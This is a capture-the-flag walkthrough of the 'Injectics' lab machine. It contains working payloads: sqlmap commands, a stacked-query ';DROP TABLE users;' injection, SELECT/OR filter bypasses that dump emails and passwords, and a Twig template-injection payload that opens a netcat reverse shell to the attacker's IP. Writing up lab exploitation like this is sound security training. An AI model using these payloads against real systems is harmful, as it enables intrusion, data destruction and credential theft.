<blockquote>
<b>INJECTICS</b><br>
</blockquote>
<blockquote>
<b>Recon</b><br><br>
  - First i ran a nmap scan with:<br>
  <pre>
    sudo nmap -sC -sV -vv 10.49.162.70
  </pre>
  - I see only two ports are open:<br>
  <br><img width="954" alt="image" src="https://github.com/user-attachments/assets/d1110843-1d6b-4fcc-af57-6300c2c10087" /><br>
  - Then i visit the webpage on port 80:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/77b32781-8ce4-4969-88bf-18a1f6d094b7" /><br>
  <br><img width="1466" alt="image" src="https://github.com/user-attachments/assets/93a8da4b-632e-44e5-bf3f-c9b8df4191d8" /><br>
</blockquote>
<blockquote>
<b>Logging in</b><br><br>
  - Upon seeing the page source code i find an interesting thing:<br>
  <br><img width="1224" alt="image" src="https://github.com/user-attachments/assets/d76e4d76-b16d-49da-abaa-e0f878e66d03" /><br>
  - After visiting that endpoint we can find this:<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/f787e546-dcc7-4c03-b378-0d33b61095ce" /><br>
  - That means if somehow the 'users' table is deleted or corrupted we can log in via theses credentails.<br>
  - Upon visiting the Log in page we see this:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/7b3bc6f3-0e7b-476d-8984-aa3c1155c953" /><br>
  - There are two ways of log in.As a normal user and as Admin.Upon viewing the page source code we can see a javascript file:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/62254c6a-2538-4501-94c6-80c8d3c77133" /><br>
  - We can see that script by visiting '/script.js':<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/13655cb7-c34c-4975-b232-fa9d9d2ca15e" /><br>
  - So this is a client side filtering to mitigate sql injection.We can easily bypass this by directly modifying the request in burp suite.<br>
  - Let's try to log in and capture that request in burp suite.<br>
  <br><img width="795" alt="image" src="https://github.com/user-attachments/assets/b6c41810-a5b6-4e24-bb68-9fa35dcf801e" /><br>
  - This is a POST request with username,password and function parameters.<br>
  - I tried to check if basic sql injection works by changing the username to:<br>
  <pre>
    ' OR 1=1;-- -
  </pre>
  - It didn't work.So first I save the request in a file named req.txt:<br>
  <br><img width="981" alt="image" src="https://github.com/user-attachments/assets/2ec0a33f-1c60-4288-ba2b-86c25a3b2750" /><br>
  <br><img width="1114" alt="image" src="https://github.com/user-attachments/assets/67d723b9-eb33-4e70-b5ad-1b6f46673477" /><br>
  - and then run sqlmap to find a sql injection point with the command:<br>
  <pre>
    qlmap -r req.txt -p username --dbms=mysql --risk=3 --level=5 --batch
  </pre>
  <br><img width="1153" alt="image" src="https://github.com/user-attachments/assets/60e24ea2-17d6-48d0-acf4-a4c00ce5e254" /><br>
  <br><img width="1147" alt="image" src="https://github.com/user-attachments/assets/5ac94b8a-26cd-4b25-807f-c4ce46a264f0" /><br>
  - After sending that payload there is no response for some seconds and then we are logged in as 'dev':<br>
  <br><img width="800" alt="image" src="https://github.com/user-attachments/assets/4e8f8c93-ae02-48b1-a3cc-dd4a029cff19" /><br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/ee0ede4e-d4d0-469b-8c18-28aaf6512b84" /><br>
</blockquote>
<blockquote>
<b>Logging in as Admin</b><br><br>
  - There are two ways we can log in as Admin.<br>
  1. First,as we have seen before in '/mail.log' page that if somehow 'users' table is deleted or corrupted we can log in via given credentials.<br>
  2. Second,by manually enumerating the database to find credentials.<br><br>
  <b>Solution 1</b>:by dropping 'users' table<br><br>
  - First we have to find an injection point.On the '/dashboard.php' page we can see 'Edit' option:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/e6f7586a-8285-459f-8174-96e7a3b48533" /><br>
  -That takes us to '/edit_leaderboard.php' page with 'rank' and 'country' parameter set:<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/16cb0cc9-e3c4-4469-8390-90dc86c85333" /><br>
  - I tried to see if basic sql injection works by inputting<br>
  <pre>
    ' OR 1=1;-- -
  </pre>
  in the Gold field.But it showed error:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/a1c7bc2e-9e5d-455e-9621-1d50e13d6ddc" /><br>
  - So I save the request again in 'req2.txt' file and run sqlmap with command:<br>
  <pre>
    sqlmap -r req2.txt --dbms=mysql --risk=3 --level=5 --batch
  </pre>
  to see if it finds any injection point.The output shows 'gold' parameter can be injected:<br>
  <br><img width="905" alt="image" src="https://github.com/user-attachments/assets/2949bd24-b89a-4f10-891a-80a55b2dfe05" /><br>
  - Let's try to inject stacked query.Stacked query includes multiple SQL query separated by (;).This allows to execute multiple query in single payload.Our goal is to delete the users table via payload:<br>
  <pre>
    ;DROP TABLE users;
  </pre>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/ab484067-a70a-4c81-b9c9-b147e3a4c9cb" /><br>
  - Looks like it worked:<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/aa2e3227-cbbe-4afc-807b-d9481ba96d1c" /><br>
  - After waiting for 1 min I clear the cookie and try to log in with:
  <pre>
    Email: secureadmin@injectics.thm
    Password: superSecurePasswd101
  </pre>
  (NOTE:WE HAVE TO LOG IN AS ADMIN.NORMAL LOGIN WON'T WORK)<br>
  - We are succesfully logged in as Admin and we get our first flag:<br>
  <br><img width="1468" alt="image" src="https://github.com/user-attachments/assets/6c44ce8f-658a-4a73-b4c9-68040caba5d5" /><br>
  <br><b>Solution 2</b>:by manual enumeration of database<br><br>
  - So far we know that 'gold' parameter can be injected.Let's test it again by retrieving the version of database.We assume that the table is 'leaderboard'.So our payload will be:<br>
  <pre>
    ;UPDATE leaderboard SET country=@@version WHERE country='USA';
  </pre>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/662ddbe6-8eb4-49da-8230-f363158ce597" /><br>
  - It worked:<br>
  <br><img width="1464" alt="image" src="https://github.com/user-attachments/assets/670a4613-1049-4d0d-8f41-9408ff7efedb" /><br>
  - Let's get the current database name via:<br>
  <pre>
    ;UPDATE leaderboard SET country=concat(DATABASE());
  </pre>
  -Current database name is 'bac_test':<br>
  <br><img width="1432" alt="image" src="https://github.com/user-attachments/assets/fcc9c885-b222-4d6b-9ed4-35945df5eb4d" /><br>
  - Let's retrieve all table names via:<br>
  <pre>
    ;UPDATE leaderboard SET country=concat((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()));
  </pre>
  - It didn't work.Nothing changed:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/5ce9c8e7-64ff-4454-b6a6-905c900c1245" /><br>
  - So may be there is some kind of fileter active.Let's check what words are being filtered by this command:<br>
  <pre>
    1;UPDATE leaderboard SET country=concat('OR',' ','SELECT',' ','group_concat(table_name)',' ','FROM',' ','information_schema.tables',' ','WHERE',' ','table_schema=database()');
  </pre>
  - From the output we can see 'OR' and 'SELECT' these two words are removed:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/50903ff4-fdc3-4087-8b1d-e195f1f5c861" /><br>
  (NOTE:'information' became 'infmation' cause 'information' contains 'or' in it.)<br>
  -We can bypass this by using 'SSELECTELECT' and 'OORR' in place of 'SELECT' and 'OR'.We can confirm this by:<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/83300453-9e55-409f-a934-11fffee7b478" /><br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/8203a58c-8897-44fa-bc09-18858cc4bc4f" /><br>
  - Now let's retrieve all table names via our modified payload(NOTE:we also have to adjust 'information' cause it contains 'or'.):<br>
  <pre>
    ;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(table_name) FROM infoorrmation_schema.tables WHERE table_schema=database()));
  </pre>
  - We can see there are two tables named leaderboard and users:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/9946ac79-fc29-45ce-8fcf-a78227864275" /><br>
  - Let's try to find all column names in 'users' table via payload:<br>
  <pre>
    1;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='users'));
  </pre>
  - We find many columns name.But our target is 'email' and 'password':<br>
  <br><img width="1470" height="729" alt="image" src="https://github.com/user-attachments/assets/3760e503-23b4-407e-92d3-63f729769569" /><br>
  - Let's extract 'email' and 'password' via:<br>
  <pre>
    1;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(email,passwoorrd) FROM users));
  </pre>
  - And we find credentials for two users- dev@injectics.thm and superadmin@injectics.thm:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/66e70763-968e-411f-a41a-84339ec20218" /><br>
  - Now after logging in as Admin with found credentials We get the first flag:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/e02031ee-223a-4b93-9bcf-d80139877749" /><br>
</blockquote>
<blockquote>
<b>Getting Reverse Shell</b><br><br>
  - After logging in as Admin we can see a new option unlocks 'profile'.On clicking on that it takes us to '/update_profile.php':<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/ffb60d49-2c82-4b06-8ce2-bd12f7edb17b" /><br>
  - Let's try to change 'First Name':<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/ecb33ba4-d6dc-4b92-9831-c2dc9631adda" /><br>
  - Upon submitting it says 'Profile updated successfully' and our new name is reflected on the home page:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/39eaf4f0-805c-43a3-917a-3dc97965226e" /><br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/9ca95435-0657-431e-8cfe-576fdddc086d" /><br>
  - This could possibly be a SSTI(Server Side Template Injection).Let's confirm that by putting '{{7*7}}' in first name field:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/76903ae7-e0c9-4337-9aca-029fa17e6b70" /><br>
  - And it's confirmed:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/84996b2d-446a-4865-8e7c-28245e30efb1" /><br>
  - Now we have to detect which template engine is being used.It's probably either Jinja2 or Twig.We can determine which one between these two by putting '{{7*'7'}}' as payload.<br>
  - If it's twig the result will be '49' but if it's jinja2 the output will be '7777777'.<br>
  - Upon seeing the result we are confirmed that twig is being used:<br>
  <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/dc3199b8-a7a1-4b8d-a61d-4a82532faeba" /><br>
  - Upon doing some research I found a payload that allowed RCE(remote code execution):<br>
  <pre>
    {{['id',' ']|sort('passthru')}}
  </pre>
  - We get the result:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/016b8281-b9fa-435f-b04d-a869b6c05971" /><br>
  - Now let's set up a listener on our attackmachine via:<br>
  <pre>
    nc -lnvp 1234
  </pre>
  - And then send this payload in 'First Name' field to connect back to our machine:<br>
  <pre>
    {{['nc 10.49.101.184 1234 -e /bin/bash',' ']|sort('passthru')}}
  </pre>
  - Upon visiting the 'Home' page I noticed that I haven't recieved any connection.May be the installed netcat doesn't allow '-e'.Let's use busybox version netcat.<br>
  <pre>
    {{['busybox nc 10.49.101.184 1234 -e /bin/bash',' ']|sort('passthru')}}
  </pre>
  - Now when we submit and then go to 'Home' in the terminal a connection is received:<br>
  <br><img width="1193" alt="image" src="https://github.com/user-attachments/assets/98409834-0431-4aa6-bdce-c51199b623e5" /><br>
  - Then we can navigate to 'flags' folder and read the flag value:<br>
  <br><img width="1156" alt="image" src="https://github.com/user-attachments/assets/ca5ad271-1ae4-4537-b4b2-6aa88f0296c1" /><br>

  
</blockquote>
